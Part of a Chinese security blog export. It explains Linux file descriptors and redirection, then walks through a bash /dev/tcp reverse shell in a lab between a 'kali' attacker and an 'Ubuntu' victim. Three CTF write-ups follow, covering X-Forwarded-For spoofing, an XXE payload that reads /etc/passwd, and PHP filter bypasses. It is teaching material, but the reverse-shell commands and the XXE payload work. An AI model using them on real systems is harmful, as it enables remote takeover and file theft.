<p>具体可以看[[理解Linux中的文件描述符(File Descriptor)]]，接下来简称文件描述符为fd。</p>
<p>当Linux系统启动后，默认会打开三个fd。分别是：</p>
<ul>
<li>标准输入 standard input -&gt; 0 -&gt; 默认设备：键盘</li>
<li>标准输出 standard output -&gt; 1 -&gt; 默认设备：显示器</li>
<li>错误输出 error output -&gt; 2 -&gt; 默认设备：显示器</li>
</ul>
<p>默认情况下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515202813.png" /></p>
<p>注意：</p>
<ol type="1">
<li>每打开一个文件，fd就会依次增加；</li>
<li>一条shell命令会继承其父进程的fd，因此所有的shell命令都会默认具有 0,1,2 三个fd；</li>
</ol>
<p><strong>文件所有输入输出都是由该进程所有打开的fd控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由fd控制）</strong></p>
<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
<h1 id="重定向">2. 重定向</h1>
<p>重定向主要分为两种：</p>
<ol type="1">
<li>输入重定向：&lt;, &lt;&lt;</li>
<li>输出重定向：&gt;, &gt;&gt;</li>
</ol>
<h2 id="重点">2.1. 重点</h2>
<ol type="1">
<li>shell执行一条指令的时候，<strong>首先会检查命令中是否存在重定向符号，如果存在，那么会首先将文件描述重定向，然后再把重定向去掉，执行指令。</strong></li>
<li>如果指令中存在多个重定向，那么<strong>重定向的解析顺序是从左到右</strong>，改变顺序可能会带来完全不同的结果。</li>
<li>&lt; 是对标准输入的重定向；&gt; 是对标准输出的重定向。</li>
</ol>
<h2 id="输入重定向">2.2. 输入重定向</h2>
<p><strong>格式</strong>： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[n]&lt; file # [n]和&lt;之间没有空格</span><br></pre></td></tr></table></figure></p>
<p><strong>说明</strong>：</p>
<ul>
<li>将文件描述符 n 重定向到 file。如果 n 省略，默认为 0</li>
</ul>
<p><strong>例子</strong>：</p>
<p>有一个文件text.txt，内容为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure></p>
<p>然后执行下面命令：（两条命令等价） <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. bash 0&lt; text.txt</span><br><span class="line">2. bash &lt; text.txt</span><br></pre></td></tr></table></figure></p>
<p>结果就是将 text.txt 中的内容当作bash的输入。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515214428.png" /></p>
<p>这个只是按照我们平常习惯的顺序写而已，还可以这么写： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. 0&lt; text.txt bash</span><br><span class="line">2. &lt; text.txt bash</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515214541.png" /></p>
<p>由于解析器解析到了重定向符号，因此优先处理重定向，将标准输入重定向到 text.txt，之后bash再从标准输入读取指令，此时标注输入已经重定向到了 text.txt，因此，bash自然就从 text.txt 中读取指令。</p>
<p><strong>图示</strong>：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515214733.png" /></p>
<h2 id="输出重定向">2.3. 输出重定向</h2>
<p><strong>格式</strong>： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[n]&gt;</span><span class="bash"> file <span class="comment"># 类似的，[n]和&gt;之间也没有空格</span></span></span><br></pre></td></tr></table></figure></p>
<p><strong>说明</strong>：</p>
<ul>
<li>将文件描述符 n 重定向到 file。如果 n 省略，默认为 1</li>
</ul>
<p><strong>例子</strong>： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. echo &quot;hello world&quot; 1&gt; text.txt</span><br><span class="line">2. echo &quot;hello life&quot; &gt; text.txt</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515215201.png" /></p>
<p>当然，只有一个重定向的时候，顺序无所谓 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">1&gt;</span><span class="bash"> text.txt <span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> text.txt <span class="built_in">echo</span> <span class="string">&quot;how are you&quot;</span></span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515215431.png" /></p>
<p><strong>图示</strong>：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515215237.png" /></p>
<h2 id="标准输出与标准错误输出重定向">2.4. 标准输出与标准错误输出重定向</h2>
<p><strong>格式</strong>：（两者效果一样） <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&amp;&gt; file  或者  &gt;&amp; file  # 注意 &gt; 和 &amp; 之间没有空格</span><br></pre></td></tr></table></figure></p>
<p><strong>说明</strong>：</p>
<ul>
<li>将标准输出与标准错误输出都重定向到 file。</li>
<li>这种格式等价于 <code>&gt; file 2&gt;&amp;1</code>。其中 <code>2&gt;&amp;1</code> 是将标准错误输出复制到标准输出，<code>&amp;</code>是为了区分文件1和文件描述符1。</li>
</ul>
<p><strong>例子</strong>：</p>
<p>先测试一下标准错误输出： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir &amp;&gt; text.txt</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515220030.png" /></p>
<p>可以看到，将标准错误输出到 text.txt 文件中。如果没有重定向，会直接显示出来</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515220126.png" /></p>
<p>再测试一下标准输出： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls &amp;&gt; text.txt</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515220233.png" /></p>
<p>而如果没有重定向，则会直接显示出来。</p>
<p><strong>图示</strong>：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515220400.png" /></p>
<h2 id="文件描述符复制">2.5. 文件描述符复制</h2>
<p><strong>格式</strong>： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[n]&lt;&amp;[m] 或者 [n]&gt;&amp;[m] # [n], [m], &gt;, &lt;, &amp; 这几个符号之间都没有空格！</span><br></pre></td></tr></table></figure></p>
<p><strong>说明</strong>：</p>
<ul>
<li>两个都是将fd n 复制到 m，两者的区别：前者是以只读的形式打开，后者是以写的形式打开。<strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对fd没有任何影响）</strong></li>
<li>这里的 <code>&amp;</code> 目的是为了区分数字名字的文件和fd，如果没有 <code>&amp;</code>，系统会认为是将fd重定向到了一个数字作为文件名的文件。</li>
</ul>
<h3 id="重点-1">2.5.1. 重点</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. cmd &gt; file 2&gt;&amp;1</span><br><span class="line">2. cmd 2&gt;&amp;1 &gt; file</span><br></pre></td></tr></table></figure>
<p>上面两个命令的执行结果完全不同</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515221734.png" /></p>
<p>可以看到前者将标准错误输出重定向到 text.txt，而后者并没有。</p>
<h4 id="命令1图解">2.5.1.1. 命令1图解</h4>
<ol type="1">
<li><p><code>&gt; text.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515221944.png" /></p></li>
<li><p><code>2&gt;&amp;1</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515222016.png" /></p></li>
</ol>
<p>先将标准输出重定向到 text.txt，然后将标准错误输出复制到标准输出。此时，相当于标准错误输出和标准输出都重定向到 text.txt</p>
<h4 id="命令2图解">2.5.1.2. 命令2图解</h4>
<ol type="1">
<li><p><code>2&gt;&amp;1</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515222140.png" /></p></li>
<li><p><code>&gt; text.txt</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515222243.png" /></p></li>
</ol>
<p>先将标准错误输出复制到标准输出，然后将标准输出重定向到 text.txt。因为最开始的时候标准错误输出和标准输出都是/dev/tty0，所以第1步相当于没有变化。也就是这两步的操作最后只有第2步起作用，将标准输出重定向到 text.txt。</p>
<h2 id="exec绑定重定向">2.6. exec绑定重定向</h2>
<p><strong>格式</strong>： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exec [n]&lt;[file,fd]</span><br><span class="line">exec [n]&gt;[file,fd]</span><br></pre></td></tr></table></figure></p>
<p>上面所描述的重定向只针对当前那条指令起作用，如果需要再绑定之后，对所有的指令都起作用，就需要用到 exec 命令。</p>
<p><strong>例子</strong>： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. exec 6&gt;&amp;1</span><br><span class="line">2. ls -l /proc/self/fd</span><br><span class="line">3. exec 1&gt;text.txt</span><br><span class="line">4. ls -l</span><br><span class="line">5. exec 1&gt;&amp;6</span><br><span class="line">6. ls -l /proc/self/fd</span><br></pre></td></tr></table></figure></p>
<p>说明：先将标准输入保存到文件描述符6，然后将标准输出绑定到文件 text.txt，接下来所有输出都会重定向到文件。使用完后，恢复标准的输出，关闭打开文件描述符6。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515224121.png" /></p>
<h3 id="重点-2">2.6.1. 重点</h3>
<p>格式： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[n]&lt;&gt;file</span><br></pre></td></tr></table></figure></p>
<p><strong>说明</strong>：</p>
<ul>
<li>以读写方式打开 file，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</li>
</ul>
<p><strong>例子</strong>：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515225138.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515225148.png" /></p>
<p>解释：第一张图是写，第二张图是读。虽然是以读写方式打开file，此时指针指向该文件的第一个位置，然后开始往里面写东西（不论里面是否有内容，都会被覆盖），并且指针不回溯。写操作结束之后，指针会停留在写操作最后一个字符的下一个位置。此时进行读操作的话，就是将该指针开始往后的内容全部读出来，指针还是会停留在读操作的最后一个字符的下一个位置。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515230215.png" /></p>
<p>原先的 text.txt 中有内容，然后重定向。先后往里面写入 whoami 和 ls 的内容，然后先利用cat方式读取（不会改变指针）。</p>
<p>接下来第一次读操作可以看到正好从<code>dev)</code>开始（写操作最后一个字符的后一个位置），而第二次读操作就没有内容了。这是因为第一次读操作之后，指针已经在文件的内容最后一个字符的下一个位置，因此没有内容读取。</p>
<h1 id="反弹shell的本质">3. 反弹shell的本质</h1>
<p>以下面反弹shell的命令为例： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>解释：</p>
<ol type="1">
<li><p><code>bash -i</code> 产生一个交互式的shell</p></li>
<li><p>/dev/tcp/ip/port: 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515231535.png" /></p>
<p>但是，如果对方在监听端口的话，就能实现与监听端口的服务器的socket通信。[[#socket通信]]</p></li>
<li><p><code>&gt;&amp; /dev/tcp/ip/port</code> 和 <code>0&gt;&amp;1</code>：交互式重定向[[#交互式重定向]]</p></li>
</ol>
<h2 id="socket通信">3.1. socket通信</h2>
<p>kali: 10.0.2.4</p>
<p>Ubuntu: 10.0.2.21</p>
<p>注意：zsh不行！！！</p>
<p>kali发送 hello： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ubuntu: nc -lvnp 3333</span><br><span class="line">2. kali: echo &quot;hello&quot; &gt; /dev/tcp/10.0.2.21/3333</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515232333.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515232319.png" /></p>
<p>（第一张图为kali，第二张图为Ubuntu）可以看到输出被重定向到了Ubuntu</p>
<p>Ubuntu回应 nice to meet you： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. kali: nc -lvnp 3333</span><br><span class="line">2. ubuntu: echo &quot;nice to meet you&quot; &gt; /dev/tcp/10.0.2.4/3333</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515232515.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515232529.png" /></p>
<p>（第一张图为kali，第二张图为Ubuntu）可以看到，输出被重定向到了kali。</p>
<p>这样，简单的通信就完成了！</p>
<h2 id="交互式重定向">3.2. 交互式重定向</h2>
<p>为了实现交互，我们需要把受害者的交互式shell的输出重定向到攻击机上。在受害者的主机上输入： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/10.0.2.4/3333</span><br></pre></td></tr></table></figure></p>
<p>示意图：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516073747.png" /></p>
<p>在这之后，受害者主机上输入的所有命令都不会直接回显，而是会在攻击者主机上显示。</p>
<p>受害者：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516073908.png" /></p>
<p>攻击者：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516073922.png" /></p>
<p>但这里存在一个问题，那就是攻击者不能够控制受害者的shell，也就是攻击者执行的命令无法在受害者主机上执行。</p>
<p>因此，可以输入下面的命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/10.0.2.4/3333</span><br></pre></td></tr></table></figure></p>
<p>这条命令的意思就是让bash -i执行来自/dev/tcp/10.0.2.4/3333的输入。<strong>将两者结合，就可实现攻击者发送指令到受害者电脑，并将执行结果回显到攻击者主机。</strong></p>
<p>两条指令结合： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/10.0.2.4/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>示意图：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516074320.png" /></p>
<p>攻击者：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516074416.png" /></p>
<p>受害者：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516074431.png" /></p>
<p>可以看到，攻击者输入的指令发送到了受害者主机，并将执行结果回显到了攻击者主机。此时还有一个问题，那就是如第二张图所示，受害者主机上可以看到攻击者执行的命令。</p>
<p>接下来可以使用 <code>&gt;&amp;</code> 或者 <code>&amp;&gt;</code> 将错误、正确输出都指向同一个地方。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/10.0.2.4/3333 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>攻击者：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516074924.png" /></p>
<p>受害者：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516074943.png" /></p>
<p>此时就不会将攻击者执行的命令回显到受害者主机上。</p>
<p>也可以写成最开始的模样： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.2.4/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
<p>图示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220516075314.png" /></p>
<h1 id="参考">4. 参考</h1>
<ol type="1">
<li><a href="https://xz.aliyun.com/t/2548">Linux反弹shell（一）文件描述符与重定向 - 先知社区</a></li>
<li><a href="https://xz.aliyun.com/t/2549">Linux 反弹shell（二）反弹shell的本质 - 先知社区</a></li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>Linux基础</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 PYWebsite</title>
    <url>/2022/04/13/MRCTF2020%20PYWebsite/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPYWebsite">PYWebsite</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，发现页面很复杂。先查看源码，发现</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231227.png" /></p>
<p>这是后面输入授权码的时候触发的，最开始还以为绕过<code>hex_md5</code>就可以了。在这串代码中还有一个<code>./flag.php</code>。</p>
<p>访问该文件得到如下界面</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231351.png" /></p>
<h1 id="解题">解题</h1>
<p>重点的提示<strong>已经记住了购买者的IP......除了购买者和我自己，没人可以看到flag</strong>。意思就是，要么我们自己购买，要么使用出题者的IP就可以看到flag。前者显然不可能，那么只有后者，这时候想到了一个HTTP头部信息<code>X-Forwarded-For</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231606.png" /></p>
<p>flag在源码中可以查看</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231627.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2019 Fake XML cookbook</title>
    <url>/2022/04/08/NCTF2019%20Fake%20XML%20cookbook/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BNCTF2019%5DFake%20XML%20cookbook">NCTF2019 Fake XML cookbook</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，显示如下的登陆界面：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172459.png" /></p>
<p>由题目可知，本题考察的应该是XXE漏洞。查看了源码之后发现只有一个JavaScript函数，但是没什么作用。因此先随便往表单输入数据看一下效果</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172659.png" /></p>
<p>发现用户名被原封不动的返回到页面，经过多次测试，确定了无论用户名输入什么都会被返回到界面。结合题目，有理由怀疑这里存在着XXE漏洞。因此，抓取数据包看看</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172854.png" /></p>
<p>这个提交的表单的就是XML，因此，确定存在XXE漏洞，并且是有回显的。</p>
<h1 id="解题">解题</h1>
<p>在POST body中添加这么一句话： <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hdf</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后<code>&lt;username&gt;</code>中的内容改为<code>&amp;xxe;</code>，并提交数据包，发现成功读取文件内容，接下来只需要读取flag就可以了。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173147.png" /></p>
<p>flag一般就在根目录或者网站当前目录，名字为<code>flag</code>。因此一一尝试一下。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173237.png" /></p>
<p>发现直接就在根目录，成功读取flag。</p>
<h1 id="总结">总结</h1>
<p>这是最简单的XXE漏洞利用。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XXE漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 套娃</title>
    <url>/2022/04/21/MRCTF2020%20%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5D套娃">MRCTF2020 套娃</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境查看页面源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure></p>
<p>除此之外，没有更多有用的信息了。</p>
<h1 id="解题">2. 解题</h1>
<h2 id="前置知识">2.1. 前置知识</h2>
<h3 id="server">2.1.1. <code>$_SERVER</code></h3>
<blockquote>
<p>$_SERVER 是 PHP 预定义变量之一，可以直接使用，它是一个包含了诸如头信息（header）、路径（path）及脚本位置（script locations）信息的数组。</p>
</blockquote>
<p>参考链接：</p>
<ul>
<li>c.biancheng.net/view/6185.html</li>
</ul>
<p>这里主要介绍一下题目中的<code>$_SERVER['QUERY_STRING']</code>。假设我们的url为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.hdfzzf.com/index.php/?name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
<p>那么经过<code>$query = $_SERVER['QUERY_STRING'];</code>之后，<code>$query</code>变为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
<p>即，该代码作用就是获得url中的参数部分。</p>
<h3 id="substr_count">2.1.2. substr_count()</h3>
<p>该函数的作用非常简单，那就是<strong>计算子串在字符串中出现的次数</strong>。</p>
<p>一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 Shanghai 在字符串中出现的次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;Shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果为：2</p>
<p>注意：该函数区分大小写。将上面例子稍作修改： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 shanghai 在字符串中出现的次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>此时结果为：0</p>
<h3 id="preg_matchpattern-string">2.1.3. preg_match(pattern, string)</h3>
<p>PHP中的正则匹配，返回值是匹配次数。<strong>它的值为0或者1</strong>，这是因为第一次匹配到的时候就会结束该函数。如果需要一直搜索到结尾，可以使用preg_match_all(pattern, string)。</p>
<p>需要注意的是，正则匹配默认都是匹配一行的，如果需要匹配多行，需要在正则表达式的最后加上<code>m</code>。</p>
<h3 id="getip">2.1.4. getIp()</h3>
<p>源码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">                        <span class="string">&quot;unknown&quot;</span>)</span><br><span class="line">                ) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> getIp();</span><br></pre></td></tr></table></figure></p>
<p>简单总结一下就是该函数通过HTTP头部中的<code>client-ip</code>来获取客户端的IP。</p>
<h2 id="解题过程">2.2. 解题过程</h2>
<h3 id="套娃1">2.2.1. 套娃1</h3>
<p>根据代码审计可以知道：</p>
<ul>
<li>要绕过if，即查询语句不能包含<code>_</code>以及<code>%5f</code>，后者就是前者url编码之后的结果；</li>
<li>b_u_p_t的值不能为23333，又得满足preg_match函数的返回值为1</li>
</ul>
<p>因为substr_count()函数区分大小写，因此可以使用大小写绕过，即<code>%5F</code>即可。</p>
<p>而preg_match默认只匹配一行，假设我们输入如下：(%oa是换行符的url编码) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23333%0a</span><br></pre></td></tr></table></figure></p>
<p>那么preg_match函数只匹配第一行，第一行只有23333，因此满足以23333开头，以23333结尾的要求，从而返回值为1。并且，此时的值不是23333，因为最后有一个换行符，因此绕过强类型匹配。</p>
<p>从而payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b%5Fu%5Fp%5Ft=23333%0a</span><br></pre></td></tr></table></figure></p>
<p>得到如下提示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094613.png" /></p>
<h3 id="套娃2">2.2.2. 套娃2</h3>
<p>去访问对应的文件，得到如下提示：（我还以为改一下XFF就可以，天真） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it?Local access only!  </span><br><span class="line">Sorry,you don&#x27;t have permission! Your ip is :sorry,this way is banned!</span><br></pre></td></tr></table></figure></p>
<p>查看源码，得到一串不知名的注释，这里有一个小技巧，可以将这个注释放入控制台执行。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094919.png" /></p>
